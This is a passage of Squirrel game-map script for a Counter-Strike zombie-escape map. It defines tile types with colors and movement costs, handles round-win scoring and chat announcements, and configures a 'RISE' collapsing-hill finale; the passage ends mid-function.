	::TYPES[5]<-	{name="FLOOR",						color=Vector(40,40,40),				cost=1,			elevation=1,		};
	::TYPES[6]<-	{name="FLOOR",						color=Vector(50,50,50),				cost=1,			elevation=2,		};
	::TYPES[7]<-	{name="FLOOR",						color=Vector(60,60,60),				cost=1,			elevation=3,		};
	::TYPES[8]<-	{name="FLOOR",						color=Vector(70,70,70),				cost=1,			elevation=4,		};
	::TYPES[9]<-	{name="FLOOR",						color=Vector(80,80,80),				cost=1,			elevation=5,		};
	::TYPES[10]<-	{name="FLOOR",						color=Vector(90,90,90),				cost=1,			elevation=6,		};
	::TYPES[11]<-	{name="FLOOR",						color=Vector(100,100,100),			cost=1,			elevation=7,		};
	::TYPES[12]<-	{name="FLOOR",						color=Vector(110,110,110),			cost=1,			elevation=8,		};
	::TYPES[13]<-	{name="FLOOR",						color=Vector(120,120,120),			cost=1,			elevation=9,		};
	::TYPES[14]<-	{name="FLOOR",						color=Vector(130,130,130),			cost=1,			elevation=10,		};
	::TYPES[15]<-	{name="FLOOR",						color=Vector(140,140,140),			cost=1,			elevation=11,		};
	::TYPES[16]<-	{name="FLOOR",						color=Vector(150,150,150),			cost=1,			elevation=12,		};
	::TYPES[17]<-	{name="FLOOR",						color=Vector(160,160,160),			cost=1,			elevation=13,		};
	::TYPES[18]<-	{name="FLOOR",						color=Vector(170,170,170),			cost=1,			elevation=14,		};
	::TYPES[19]<-	{name="FLOOR",						color=Vector(180,180,180),			cost=1,			elevation=15,		};
	::TYPES[20]<-	{name="FLOOR",						color=Vector(190,190,190),			cost=1,			elevation=16,		};
	::TYPES[21]<-	{name="FLOOR",						color=Vector(200,200,200),			cost=1,			elevation=17,		};
	::TYPES[22]<-	{name="FLOOR",						color=Vector(210,210,210),			cost=1,			elevation=18,		};
	::TYPES[23]<-	{name="FLOOR",						color=Vector(220,220,220),			cost=1,			elevation=19,		};
	::TYPES[24]<-	{name="FLOOR",						color=Vector(230,230,230),			cost=1,			elevation=20,		};
	::TYPES[25]<-	{name="PLATFORM",					color=Vector(100,95,0),				cost=1,			elevation=1,		};
	::TYPES[26]<-	{name="PLATFORM",					color=Vector(113,107,0),			cost=1,			elevation=2,		};
	::TYPES[27]<-	{name="PLATFORM",					color=Vector(125,119,0),			cost=1,			elevation=3,		};
	::TYPES[28]<-	{name="PLATFORM",					color=Vector(132,125,0),			cost=1,			elevation=4,		};
	::TYPES[29]<-	{name="PLATFORM",					color=Vector(145,137,0),			cost=1,			elevation=5,		};
	::TYPES[30]<-	{name="PLATFORM",					color=Vector(155,148,0),			cost=1,			elevation=6,		};
	::TYPES[31]<-	{name="PLATFORM",					color=Vector(166,157,0),			cost=1,			elevation=7,		};
	::TYPES[32]<-	{name="PLATFORM",					color=Vector(174,166,0),			cost=1,			elevation=8,		};
	::TYPES[33]<-	{name="PLATFORM",					color=Vector(183,173,0),			cost=1,			elevation=9,		};
	::TYPES[34]<-	{name="PLATFORM",					color=Vector(198,188,0),			cost=1,			elevation=10,		};
	::TYPES[35]<-	{name="PLATFORM",					color=Vector(210,200,0),			cost=1,			elevation=11,		};
	::TYPES[36]<-	{name="PLATFORM",					color=Vector(221,210,0),			cost=1,			elevation=12,		};
	::TYPES[37]<-	{name="PLATFORM",					color=Vector(232,220,0),			cost=1,			elevation=13,		};
	::TYPES[38]<-	{name="PLATFORM",					color=Vector(240,228,0),			cost=1,			elevation=14,		};
	::TYPES[39]<-	{name="PLATFORM",					color=Vector(251,238,0),			cost=1,			elevation=15,		};
	::TYPES[40]<-	{name="PLATFORM",					color=Vector(255,243,15),			cost=1,			elevation=16,		};
	::TYPES[41]<-	{name="PLATFORM",					color=Vector(255,248,108),			cost=1,			elevation=17,		};
	::TYPES[42]<-	{name="PLATFORM",					color=Vector(255,249,128),			cost=1,			elevation=18,		};
	::TYPES[43]<-	{name="PLATFORM",					color=Vector(255,250,151),			cost=1,			elevation=19,		};
	::TYPES[44]<-	{name="PLATFORM",					color=Vector(255,251,179),			cost=1,			elevation=20,		};
	::TYPES[45]<-	{name="FLOORCEILING",				color=Vector(80,49,14),				cost=1,			elevation=1,		};
	::TYPES[46]<-	{name="FLOORCEILING",				color=Vector(101,62,18),			cost=1,			elevation=2,		};
	::TYPES[47]<-	{name="FLOORCEILING",				color=Vector(116,70,20),			cost=1,			elevation=3,		};
	::TYPES[48]<-	{name="FLOORCEILING",				color=Vector(134,82,23),			cost=1,			elevation=4,		};
	::TYPES[49]<-	{name="FLOORCEILING",				color=Vector(149,90,26),			cost=1,			elevation=5,		};
	::TYPES[50]<-	{name="FLOORCEILING",				color=Vector(165,100,29),			cost=1,			elevation=6,		};
	::TYPES[51]<-	{name="FLOORCEILING",				color=Vector(175,106,31),			cost=1,			elevation=7,		};
	::TYPES[52]<-	{name="FLOORCEILING",				color=Vector(188,115,33),			cost=1,			elevation=8,		};
	::TYPES[53]<-	{name="FLOORCEILING",				color=Vector(197,120,35),			cost=1,			elevation=9,		};
	::TYPES[54]<-	{name="FLOORCEILING",				color=Vector(206,125,36),			cost=1,			elevation=10,		};
	::TYPES[55]<-	{name="FLOORCEILING",				color=Vector(218,132,37),			cost=1,			elevation=11,		};
	::TYPES[56]<-	{name="FLOORCEILING",				color=Vector(220,139,50),			cost=1,			elevation=12,		};
	::TYPES[57]<-	{name="FLOORCEILING",				color=Vector(223,149,66),			cost=1,			elevation=13,		};
	::TYPES[58]<-	{name="FLOORCEILING",				color=Vector(225,156,81),			cost=1,			elevation=14,		};
	::TYPES[59]<-	{name="FLOORCEILING",				color=Vector(227,164,94),			cost=1,			elevation=15,		};
	::TYPES[60]<-	{name="FLOORCEILING",				color=Vector(230,172,108),			cost=1,			elevation=16,		};
	::TYPES[61]<-	{name="FLOORCEILING",				color=Vector(233,182,124),			cost=1,			elevation=17,		};
	::TYPES[62]<-	{name="FLOORCEILING",				color=Vector(236,192,145),			cost=1,			elevation=18,		};
	::TYPES[63]<-	{name="FLOORCEILING",				color=Vector(238,199,155),			cost=1,			elevation=19,		};
	::TYPES[64]<-	{name="FLOORCEILING",				color=Vector(241,209,173),			cost=1,			elevation=20,		};
	::TYPES[105]<-	{name="FLOORCEILINGTALL",			color=Vector(95,28,5),				cost=1,			elevation=1,		};
	::TYPES[106]<-	{name="FLOORCEILINGTALL",			color=Vector(107,31,5),				cost=1,			elevation=2,		};
	::TYPES[107]<-	{name="FLOORCEILINGTALL",			color=Vector(124,35,5),				cost=1,			elevation=3,		};
	::TYPES[108]<-	{name="FLOORCEILINGTALL",			color=Vector(133,37,5),				cost=1,			elevation=4,		};
	::TYPES[109]<-	{name="FLOORCEILINGTALL",			color=Vector(141,39,5),				cost=1,			elevation=5,		};
	::TYPES[110]<-	{name="FLOORCEILINGTALL",			color=Vector(150,41,5),				cost=1,			elevation=6,		};
	::TYPES[111]<-	{name="FLOORCEILINGTALL",			color=Vector(163,45,5),				cost=1,			elevation=7,		};
	::TYPES[112]<-	{name="FLOORCEILINGTALL",			color=Vector(173,48,5),				cost=1,			elevation=8,		};
	::TYPES[113]<-	{name="FLOORCEILINGTALL",			color=Vector(186,51,5),				cost=1,			elevation=9,		};
	::TYPES[114]<-	{name="FLOORCEILINGTALL",			color=Vector(197,53,5),				cost=1,			elevation=10,		};
	::TYPES[115]<-	{name="FLOORCEILINGTALL",			color=Vector(205,55,5),				cost=1,			elevation=11,		};
	::TYPES[116]<-	{name="FLOORCEILINGTALL",			color=Vector(216,58,5),				cost=1,			elevation=12,		};
	::TYPES[117]<-	{name="FLOORCEILINGTALL",			color=Vector(226,61,5),				cost=1,			elevation=13,		};
	::TYPES[118]<-	{name="FLOORCEILINGTALL",			color=Vector(235,63,5),				cost=1,			elevation=14,		};
	::TYPES[119]<-	{name="FLOORCEILINGTALL",			color=Vector(248,66,5),				cost=1,			elevation=15,		};
	::TYPES[120]<-	{name="FLOORCEILINGTALL",			color=Vector(251,78,19),			cost=1,			elevation=16,		};
	::TYPES[121]<-	{name="FLOORCEILINGTALL",			color=Vector(252,92,39),			cost=1,			elevation=17,		};
	::TYPES[122]<-	{name="FLOORCEILINGTALL",			color=Vector(252,105,56),			cost=1,			elevation=18,		};
	::TYPES[123]<-	{name="FLOORCEILINGTALL",			color=Vector(253,124,81),			cost=1,			elevation=19,		};
	::TYPES[124]<-	{name="FLOORCEILINGTALL",			color=Vector(253,140,102),			cost=1,			elevation=20,		};
	::TYPES[65]<-	{name="LIQUID_SHALLOW",				color=Vector(176,243,255),			cost=2,			elevation=null,		};
	::TYPES[66]<-	{name="LIQUID",						color=Vector(0,217,255),			cost=2,			elevation=null,		};
	::TYPES[67]<-	{name="LIQUID_FALL",				color=Vector(0,108,198),			cost=3,			elevation=null,		};
	::TYPES[68]<-	{name="LIQUID_TUNNEL",				color=Vector(0,111,130),			cost=2,			elevation=null,		};
	::TYPES[69]<-	{name="LIQUID_TUNNELWALL",			color=Vector(0,80,100),				cost=3,			elevation=null,		};
	::TYPES[70]<-	{name="LIQUID_STREAM",				color=Vector(11,45,108),			cost=3,			elevation=null,		};
	::TYPES[71]<-	{name="LIQUID_STREAM_L",			color=Vector(67,125,235),			cost=3,			elevation=null,		};
	::TYPES[72]<-	{name="LIQUID_STREAM_R",			color=Vector(29,100,231),			cost=3,			elevation=null,		};
	::TYPES[73]<-	{name="LIQUID_STREAM_U",			color=Vector(19,78,185),			cost=3,			elevation=null,		};
	::TYPES[74]<-	{name="LIQUID_STREAM_D",			color=Vector(16,66,158),			cost=3,			elevation=null,		};
	::TYPES[75]<-	{name="HAZLIQUID_SHALLOW",			color=Vector(255,159,159),			cost=3,			elevation=null,		};
	::TYPES[76]<-	{name="HAZLIQUID",					color=Vector(255,55,55),			cost=3,			elevation=null,		};
	::TYPES[77]<-	{name="HAZLIQUID_FALL",				color=Vector(164,32,91),			cost=3,			elevation=null,		};
	::TYPES[78]<-	{name="HAZLIQUID_TUNNEL",			color=Vector(148,12,18),			cost=3,			elevation=null,		};
	::TYPES[79]<-	{name="HAZLIQUID_TUNNELWALL",		color=Vector(100,0,0),				cost=4,			elevation=null,		};
	::TYPES[80]<-	{name="HAZLIQUID_STREAM",			color=Vector(84,10,30),				cost=3,			elevation=null,		};
	::TYPES[81]<-	{name="HAZLIQUID_STREAM_L",			color=Vector(232,51,101),			cost=3,			elevation=null,		};
	::TYPES[82]<-	{name="HAZLIQUID_STREAM_R",			color=Vector(220,24,79),			cost=3,			elevation=null,		};
	::TYPES[83]<-	{name="HAZLIQUID_STREAM_U",			color=Vector(179,19,63),			cost=3,			elevation=null,		};
	::TYPES[84]<-	{name="HAZLIQUID_STREAM_D",			color=Vector(135,14,47),			cost=3,			elevation=null,		};
	::TYPES[85]<-	{name="TRAPFLOOR",					color=Vector(255,157,255),			cost=1,			elevation=null,		};
	::TYPES[86]<-	{name="TRAPSTEP",					color=Vector(255,102,255),			cost=1,			elevation=null,		};
	::TYPES[87]<-	{name="TRAPVICINITY",				color=Vector(255,32,255),			cost=1,			elevation=null,		};
	::TYPES[88]<-	{name="TRAPSPAWN",					color=Vector(232,0,232),			cost=1,			elevation=null,		};
	::TYPES[89]<-	{name="TRAPRANDOM",					color=Vector(164,0,164),			cost=1,			elevation=null,		};
	::TYPES[90]<-	{name="DETAIL",						color=Vector(185,122,87),			cost=2,			elevation=null,		};
	::TYPES[91]<-	{name="BREAKABLE",					color=Vector(136,84,55),			cost=2,			elevation=null,		};
	::TYPES[92]<-	{name="ELEVATOR",					color=Vector(232,139,0),			cost=4,			elevation=null,		};
	::TYPES[93]<-	{name="ITEM_H",						color=Vector(190,194,252),			cost=1,			elevation=null,		};
	::TYPES[94]<-	{name="ITEM_Z",						color=Vector(143,152,250),			cost=1,			elevation=null,		};
	::TYPES[95]<-	{name="GENERICHOLD",				color=Vector(189,145,249),			cost=3,			elevation=null,		};
	::TYPES[96]<-	{name="HOLD_1",						color=Vector(179,255,224),			cost=3,			elevation=null,		};
	::TYPES[97]<-	{name="BUTTON_1",					color=Vector(132,255,206),			cost=2,			elevation=null,		};
	::TYPES[98]<-	{name="HOLD_2",						color=Vector(70,255,181),			cost=3,			elevation=null,		};
	::TYPES[99]<-	{name="BUTTON_2",					color=Vector(0,244,147),			cost=2,			elevation=null,		};
	::TYPES[100]<-	{name="ENDBUTTON",					color=Vector(111,13,242),			cost=2,			elevation=null,		};
	::TYPES[101]<-	{name="HOLD_3",						color=Vector(0,217,130),			cost=3,			elevation=null,		};
	::TYPES[102]<-	{name="BUTTON_3",					color=Vector(0,196,117),			cost=2,			elevation=null,		};
	::TYPES[103]<-	{name="HOLD_4",						color=Vector(0,155,94),				cost=3,			elevation=null,		};
	::TYPES[104]<-	{name="BUTTON_4",					color=Vector(0,136,82),				cost=2,			elevation=null,		};
	::TYPES[125]<-	{name="BOOSTPAD_JUMP",				color=Vector(0,140,0),				cost=3,			elevation=null,		};
	::TYPES[126]<-	{name="BOOSTPAD_L",					color=Vector(55,255,55),			cost=3,			elevation=null,		};
	::TYPES[127]<-	{name="BOOSTPAD_R",					color=Vector(6,255,6),				cost=3,			elevation=null,		};
	::TYPES[128]<-	{name="BOOSTPAD_U",					color=Vector(0,215,0),				cost=3,			elevation=null,		};
	::TYPES[129]<-	{name="BOOSTPAD_D",					color=Vector(0,183,0),				cost=3,			elevation=null,		};
	::TYPES[130]<-	{name="LOWGRAV",					color=Vector(100,92,235),			cost=2,			elevation=null,		};
	::TYPES[131]<-	{name="TELEPORT_1",					color=Vector(227,255,119),			cost=3,			elevation=null,		};
	::TYPES[132]<-	{name="TELEPORTDEST_1",				color=Vector(221,255,83),			cost=2,			elevation=null,		};
	::TYPES[133]<-	{name="TELEPORT_2",					color=Vector(213,255,43),			cost=3,			elevation=null,		};
	::TYPES[134]<-	{name="TELEPORTDEST_2",				color=Vector(205,255,4),			cost=2,			elevation=null,		};
	::TYPES[135]<-	{name="AIRSLIDE",					color=Vector(58,49,230),			cost=2,			elevation=null,		};
	::TYPES[136]<-	{name="TELEPORT_3",					color=Vector(201,251,0),			cost=3,			elevation=null,		};
	::TYPES[137]<-	{name="TELEPORTDEST_3",				color=Vector(196,244,0),			cost=2,			elevation=null,		};
	::TYPES[138]<-	{name="TELEPORT_4",					color=Vector(187,234,0),			cost=3,			elevation=null,		};
	::TYPES[139]<-	{name="TELEPORTDEST_4",				color=Vector(181,225,0),			cost=2,			elevation=null,		};
	::TYPES[140]<-	{name="LOWGRAV_FLOOR",				color=Vector(77,68,234),			cost=3,			elevation=null,		};
	::TYPES[141]<-	{name="CLIMB",						color=Vector(183,117,28),			cost=2,			elevation=null,		};
	::TYPES[142]<-	{name="CROUCH",						color=Vector(135,100,50),			cost=2,			elevation=null,		};
	::TYPES[143]<-	{name="CROUCHTALL",					color=Vector(170,125,60),			cost=2,			elevation=null,		};
	::TYPES[144]<-	{name="RANDOM",						color=Vector(100,0,100),			cost=4,			elevation=null,		};//UPDATE cost to match most expensive type
	::TYPES[145]<-	{name="FLOORBLOCK",					color=Vector(60,210,160),			cost=0,			elevation=null,		};
	::TYPES[146]<-	{name="EMPTY_LOS",					color=Vector(240,240,240),			cost=0,			elevation=null,		};
	::TYPES[147]<-	{name="CROUCH_NOFLOOR",				color=Vector(130,90,40),			cost=1,			elevation=null,		};
	::TYPES[148]<-	{name="ELEVATOR_FLOOR",				color=Vector(222,129,0),			cost=4,			elevation=null,		};
	::TYPES[149]<-	{name="ELEVATOR_CEILING",			color=Vector(212,119,0),			cost=4,			elevation=null,		};
	::TYPES[150]<-	{name="ELEVATOR_CEILINGTALL",		color=Vector(202,109,0),			cost=4,			elevation=null,		};
	::TYPES[151]<-	{name="ELEVATORBIG",				color=Vector(242,149,0),			cost=4,			elevation=null,		};
	::TYPES[152]<-	{name="ELEVATORHUGE",				color=Vector(252,159,0),			cost=4,			elevation=null,		};
	::TYPES[153]<-	{name="HAZPLANE_BOTTOM",			color=Vector(197,112,143),			cost=4,			elevation=null,		};
	::TYPES[154]<-	{name="HAZPLANE_TOP",				color=Vector(205,133,160),			cost=0,			elevation=null,		};
	::TYPES[155]<-	{name="HAZPLANE_SLOW",				color=Vector(179,72,113),			cost=0,			elevation=null,		};
	::TYPES[156]<-	{name="HAZPLANE_FAST",				color=Vector(187,89,126),			cost=0,			elevation=null,		};
	::TYPES[157]<-	{name="HAZPLANE_HARSH",				color=Vector(150,61,95),			cost=0,			elevation=null,		};
	::TYPES[158]<-	{name="LIQUID_STREAM_SHALLOW",		color=Vector(21,45,108),			cost=3,			elevation=null,		};
	::TYPES[159]<-	{name="LIQUID_STREAM_L_SHALLOW",	color=Vector(77,125,235),			cost=3,			elevation=null,		};
	::TYPES[160]<-	{name="LIQUID_STREAM_R_SHALLOW",	color=Vector(39,100,231),			cost=3,			elevation=null,		};
	::TYPES[161]<-	{name="LIQUID_STREAM_U_SHALLOW",	color=Vector(29,78,185),			cost=3,			elevation=null,		};
	::TYPES[162]<-	{name="LIQUID_STREAM_D_SHALLOW",	color=Vector(26,66,158),			cost=3,			elevation=null,		};
	::TYPES[163]<-	{name="HAZLIQUID_STREAM_SHALLOW",	color=Vector(94,10,30),				cost=3,			elevation=null,		};
	::TYPES[164]<-	{name="HAZLIQUID_STREAM_L_SHALLOW",	color=Vector(242,51,101),			cost=3,			elevation=null,		};
	::TYPES[165]<-	{name="HAZLIQUID_STREAM_R_SHALLOW",	color=Vector(230,24,79),			cost=3,			elevation=null,		};
	::TYPES[166]<-	{name="HAZLIQUID_STREAM_U_SHALLOW",	color=Vector(189,19,63),			cost=3,			elevation=null,		};
	::TYPES[167]<-	{name="HAZLIQUID_STREAM_D_SHALLOW",	color=Vector(145,14,47),			cost=3,			elevation=null,		};
	::TYPES[168]<-	{name="MOVEPLAT",					color=Vector(226,211,109),			cost=4,			elevation=null,		};
	::TYPES[169]<-	{name="MOVEPLATBIG",				color=Vector(216,201,99),			cost=4,			elevation=null,		};
	::TYPES[170]<-	{name="MOVEPLATHUGE",				color=Vector(206,201,89),			cost=4,			elevation=null,		};
	::TYPES[171]<-	{name="MOVEPLAT_SLOW",				color=Vector(196,191,79),			cost=0,			elevation=null,		};
	::TYPES[172]<-	{name="MOVEPLAT_FAST",				color=Vector(186,181,69),			cost=0,			elevation=null,		};
	::TYPES[173]<-	{name="MOVEPLAT_DEST_1",			color=Vector(176,171,59),			cost=0,			elevation=null,		};
	::TYPES[174]<-	{name="MOVEPLAT_DEST_2",			color=Vector(166,161,49),			cost=0,			elevation=null,		};
	::TYPES[175]<-	{name="MOVEPLAT_DEST_3",			color=Vector(156,151,39),			cost=0,			elevation=null,		};
	::TYPES[176]<-	{name="MOVEPLAT_DEST_4",			color=Vector(146,141,29),			cost=0,			elevation=null,		};
	::TYPES[177]<-	{name="MOVEPLAT_DEST_5",			color=Vector(136,131,19),			cost=0,			elevation=null,		};
	::TYPES[178]<-	{name="MOVEPLAT_DEST_6",			color=Vector(126,121,9),			cost=0,			elevation=null,		};
	::TYPES[179]<-	{name="MOVEPLAT_DEST_7",			color=Vector(116,111,0),			cost=0,			elevation=null,		};
	::TYPES[180]<-	{name="MOVEPLAT_DEST_8",			color=Vector(106,101,0),			cost=0,			elevation=null,		};
	::TYPES[181]<-	{name="MOVEPLAT_DEST_9",			color=Vector(96,91,0),				cost=0,			elevation=null,		};
	::TYPES[182]<-	{name="MOVEPLAT_DEST_10",			color=Vector(86,81,0),				cost=0,			elevation=null,		};
	::TYPES[183]<-	{name="PLATFORM_HIDDEN",			color=Vector(189,236,0),			cost=1,			elevation=null,		};
	::TYPES[184]<-	{name="PLATFORM_HIDDEN_BRIDGE",		color=Vector(189,236,20),			cost=2,			elevation=null,		};
	::TYPES[185]<-	{name="PLATFORM_BRIDGE",			color=Vector(169,216,0),			cost=2,			elevation=null,		};
	::TYPES[186]<-	{name="FLOORBLOCK_U",				color=Vector(62,212,162),			cost=0,			elevation=null,		};
	::TYPES[187]<-	{name="FLOORBLOCK_D",				color=Vector(64,214,164),			cost=0,			elevation=null,		};
	::TYPES[188]<-	{name="FLOORBLOCK_L",				color=Vector(66,216,166),			cost=0,			elevation=null,		};
	::TYPES[189]<-	{name="FLOORBLOCK_R",				color=Vector(68,218,168),			cost=0,			elevation=null,		};
	::TYPES[190]<-	{name="MOVEPLAT_DEST_11",			color=Vector(76,71,0),				cost=0,			elevation=null,		};
	::TYPES[191]<-	{name="MOVEPLAT_DEST_12",			color=Vector(66,61,0),				cost=0,			elevation=null,		};
	::TYPES[192]<-	{name="MOVEPLAT_DEST_13",			color=Vector(56,51,0),				cost=0,			elevation=null,		};
	::TYPES[193]<-	{name="MOVEPLAT_DEST_14",			color=Vector(46,41,0),				cost=0,			elevation=null,		};
	::TYPES[195]<-	{name="HOLD_1_INVERTED",			color=Vector(0,125,84),				cost=3,			elevation=null,		};
	::TYPES[196]<-	{name="HOLD_2_INVERTED",			color=Vector(0,105,74),				cost=3,			elevation=null,		};
	::TYPES[197]<-	{name="HOLD_3_INVERTED",			color=Vector(0,85,64),				cost=3,			elevation=null,		};
	::TYPES[198]<-	{name="HOLD_4_INVERTED",			color=Vector(0,65,54),				cost=3,			elevation=null,		};
	::TYPES[199]<-	{name="WALL_HIDDEN",				color=Vector(22,22,22),				cost=2,			elevation=null,		};

	
		//more to come...? (probably not)
	//::TYPES[xxxxx]<-	{name="xxxxx",					color=Vector(xxxxx,xxxxx,xxxxx),			cost=xxxxx,			elevation=null,		};
	
	::TYPES[9998]<-	{name="ASSUMEDFLOOR"				color=Vector(80,230,180)			cost=1,			elevation=null		};
	::TYPES[9999]<-	{name="COLOR"						color=Vector(255,255,255)			cost=1,			elevation=null		};


rtype <- spot;
//OLD FUNCTION - SEE "//ELEVATOR_FREEZE_FIX NEW" FOR NEW SOLUTION
::elehold_enable <- true;			//set to false to disable completely
::elehold_setlocalorigin <- false;	//set to false if shit breaks for people
::ELEHOLD_FUNC <- function(handle,elevator_hold)
{
	if(!::elehold_enable)return;
	if(!elevator_hold)return;	//is hold - ignore
	EntFireByHandle(handle,"DisableDraw","",0.00,null,null);
	EntFireByHandle(handle,"EnableDraw","",0.10,null,null);
	EntFireByHandle(handle,"EnableDraw","",0.50,null,null);
	EntFireByHandle(handle,"EnableDraw","",0.95,null,null);
	EntFireByHandle(handle,"EnableDraw","",1.05,null,null);
	if(::elehold_setlocalorigin)
		//handle.SetLocalOrigin(Vector(0,0,0));		//naah not needed it seems?
		EntFireByHandle(handle,"setlocalorigin","0 0 0",1.00,null,null);
}
::ROUND_WIN_SCORE_ADD <- 100;	//how much score to give to those who won a stage
::round_already_won <- false;
::RoundWon<-function(by_event=true)			//__CSS__ 'by_event' added, if true it means that the round was won by "round_end" (all zombies dead)
{
	::manager.GetScriptScope().RoundEndStat();
	if(::round_already_won)return;
	printl("::RoundWon() - CALLED");
	::round_already_won=true;
	
	
	if(!::finale_started && !SlaySolo()){		//__CSS__ css5_no_solofagging
		for(local h;h=Entities.FindByName(h,"player");){
			if(h.GetTeam()==3 && h.IsAlive())
				::HurtPlayer(h,true);
		}
		printl("::RoundWon() - ABORTED");
		return;		
	}
	
	
	local stage_current = (0+::stage);
	local stage_next = (1+::stage);
	try{
		::SendCustomEvent("roundwon_called",{stage_current=stage_current,stage_next=stage_next});
	}catch(e){printl("[::RoundWon() ::SendCustomEvent ERROR]: "+e);}
	::stage++;
	local message = "";
	if(::finale_started)
	{
		if(!::finale_checkout_checked)	
			message = "YOU WON THE MAP - ENABLING INFINITY MODE";
		else
			message = "YOU WON THE MAP IN INFINITE MODE ("+::finale_checkout_mapspawnindex.tostring()+" levels | "+maps.len().tostring()+" map_pool) - REPEATING INFINITY MODE";
	}
	else
	{
		message = "you completed stage "+::STAGES[stage_current].stage.tostring()+
			" ("+::STAGES[stage_current].theme.tostring()+")";
		if(stage_next >= ::STAGES.len())
		{
			if(stage_next == ::STAGES.len())
				message = message + " - moving on to the finale";
			else
				message = message + " - YOU WON THE MAP - ENABLING INFINITY MODE";
		}
		else
			message = message + " - moving on to stage "+::STAGES[stage_next].stage.tostring()+
				" ("+::STAGES[stage_next].theme.tostring()+")";
	}
	message = message + " (SID:"+::SESSION_ID+")";
	::ServerSay("say [STAGE] "+message,0.00,null);
	printl("[STAGE] "+message);
	
	
	//__CSS__ give +100 score to everyone's that alive:
	if(by_event)	//"round_end" called, all zombies should be dead, give score to everyone alive (as teams may be scrambled on round end)
	{
		for(local h;h=Entities.FindByClassname(h,"player");){
			if(h==null||!h.IsValid()||!h.IsAlive())continue;
			::AddScore(::ROUND_WIN_SCORE_ADD,h,true);
		}
	}
	else			//"round_end" wasn't called, zombies may be alive, give score to CT's alive
	{
		for(local h;h=Entities.FindByClassname(h,"player");){
			if(h==null||!h.IsValid()||!h.IsAlive()||h.GetTeam()!=3)continue;
			::AddScore(::ROUND_WIN_SCORE_ADD,h,true);
		}
	}
}
::ENDINGS <- {
				//XXXXXXXXXX={	cancel_mapspawn=false,		movetp_clean=true,
				//	function Run(){
				//		::delay_check_enabled = false;
				//		//.....
				//	}},
				RISE={	cancel_mapspawn=true,		movetp_clean=true,
						tp_delay = 18.00,
						slay_time = 119.70,
						slay_time_block_kill_safe = 140.00,
						slay_time_all = 160,
						hill_length = 60,
						hill_width = 4,
						top_length = 10,
						telehurt_offset = 3000,
						process_full_delay = 24.00,
						process_full_startlimit = 68,
						climbsections = [//[row_index,ladder_climb,...]		//ladder_climb:(1:ladder)(2:climbhard)(3:climb)
								50,		2,	
								51,		3,	
								52,		1,	
								53,		1
							],		
						climbheight = 6.40,
						climbamount = 3,
						zplat_move_delay = 28.00,
						zplat_height = 10.00,
						zplat_tpoffset = 25.00,
						zplat_speed = 85,
						zplat_targetofs_side = -400,
						zplat_targetofs_height = -260,
						hazliquid_move_delay = 22.50,
						hazliquid_speed = 35,
						hazliquid_spawnoffset = -750,
						hazliquid_targetlip = 100,
						collapse_delay = 28.00,
						collapse_factor = 0.010,
						collapse_climbkill_delay = 70.00,
						collapse_piece_delay_rng_min = -17.00,
						collapse_piece_delay_rng_max = 20.00,
						collapse_piece_delay_min = 3.00,
						collapse_piece_delay_max = 8.00,
						collapse_piece_killtime = 1.50,
						collapse_piece_lower = -12,
						collapse_piece_tint = "255 150 150",	//null:ignore
					epos = Vector(),
					eposdir = Vector(1,0,0),
					eposdirleft = Vector(1,0,0),
					function RunCollapse(){
						EntFire("ending_rise_climbblocks","Kill","",collapse_climbkill_delay,null);
						local pq = [];
						for(local h;h=Entities.FindByNameWithin(h,"ending_rise_blocks*",epos,30000);)
						{
							pq.push({h=h,function Run(){	//__CSS__thisified
								local dist = ::GetDistance(::ENDINGS.RISE.epos,this.h.GetOrigin());
								local time = (dist*::ENDINGS.RISE.collapse_factor);
								time += RandomFloat(::ENDINGS.RISE.collapse_piece_delay_rng_min,::ENDINGS.RISE.collapse_piece_delay_rng_max);
								if(time<0.00)time=0.00;
								else if(time>200.00)time=200.00;
								local collapse_piece_delay = RandomFloat(::ENDINGS.RISE.collapse_piece_delay_min,::ENDINGS.RISE.collapse_piece_delay_max);
								

								
								
								::CollapseTile(this.h,function(hh){
									hh.AcceptInput("DisableMotion","",null,null);
									
									//__CSS__ css3 fix
									EntFireByHandle(hh,"RunScriptCode","self.SetOrigin(self.GetOrigin()+Vector(0,0,"+::ENDINGS.RISE.collapse_piece_lower.tostring()+"));",
										time+0.00,null,null);
									if(::ENDINGS.RISE.collapse_piece_tint!=null)
										EntFireByHandle(hh,"AddOutput","rendercolor "+::ENDINGS.RISE.collapse_piece_tint,time+0.00,null,null);
									
									EntFireByHandle(hh,"EnableMotion","",time+collapse_piece_delay+0.05,null,null);
									EntFireByHandle(hh,"AddOutput","rendermode 1",time+collapse_piece_delay+0.00,null,null);
									EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",time+collapse_piece_delay+0.00,null,null);
									EntFireByHandle(hh,"Kill","",::ENDINGS.RISE.collapse_piece_killtime+time+collapse_piece_delay,null,null);
								});
								//EntFireByHandle(this.h,"EnableMotion","",time+collapse_piece_delay+0.05,null,null);
								//EntFireByHandle(this.h,"AddOutput","rendermode 1",time+collapse_piece_delay+0.00,null,null);
								//EntFireByHandle(this.h,"RunScriptCode","self.SetCollisionGroup(10);",time+collapse_piece_delay+0.00,null,null);
								//EntFireByHandle(this.h,"Kill","",::ENDINGS.RISE.collapse_piece_killtime+time+collapse_piece_delay,null,null);
								
							}});
						}
						::Process(pq,0.01);
					},function Run(){
						::delay_check_enabled = false;
						::TELEHURT_Z_OFFSET = telehurt_offset;
						if(::ENABLE_ENDING_MUSIC){::Sound("#music/luffaren_collective/mountains.mp3",Vector(),null,0,150.00,100,10);}
						EntFire("ending_rise_tpmover","Kill","",slay_time,null);
						EntFire("ending_rise_blocks*","Kill","",slay_time_block_kill_safe,null);
						EntFire("manager","RunScriptCode","EnableSpawnKiller();",slay_time,null);
						EntFire("manager","RunScriptCode","EnableMassKillerAll();",slay_time_all,null);
						::ServerSay("say [RISE ENDING]",0.00,null);
						::ServerSay("say [RISE ENDING]",0.01,null);
						::ServerSay("say [RISE ENDING]",0.02,null);
						::ServerSay("say [RISE ENDING] DEFEND YOUR WAY TO THE TOP",1.03,null);
						::ServerSay("say [RISE ENDING] THE VERY END IS YOUR SAFE HAVEN",2.04,null);
						::ServerSay("say [RISE ENDING] THE HILL WILL GRADUALLY COLLAPSE",3.05,null);
						::ServerSay("say [RISE ENDING] HOLD BACK THE ZOMBIES TO SURVIVE",4.06,null);
						::ServerSay("say [RISE ENDING] GOOD LUCK",5.07,null);
						epos = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex-1].end_pos;
						eposdir = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex-1].direction_next;
